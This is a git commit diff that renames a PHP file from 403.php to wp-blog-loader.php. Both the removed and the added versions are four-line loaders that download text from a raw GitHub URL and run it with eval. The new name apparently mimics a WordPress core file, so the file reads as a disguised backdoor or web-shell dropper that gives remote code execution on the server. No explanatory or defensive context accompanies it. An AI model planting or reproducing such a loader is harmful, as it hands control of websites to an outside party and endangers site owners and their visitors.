f8163d0c98b11be7d22aee2fd1b9987a338c1b13
seovennn <seovensya29@gmail.com>
2026-07-30 01:40:18 +0700

    Update and rename 403.php to wp-blog-loader.php

--- 403.php
+++
@@ -1,4 +0,0 @@
-<?php
-$zhyvenseo = file_get_contents('https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/obfuscator-403.txt');
-$zhyvenseo = "?> ".$zhyvenseo;
-eval($zhyvenseo);
---
+++ wp-blog-loader.php
@@ -0,0 +1,4 @@
+<?php
+$zhyvenseo = file_get_contents('https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/obfuscator-acak.txt');
+$zhyvenseo = "?> ".$zhyvenseo;
+eval($zhyvenseo);
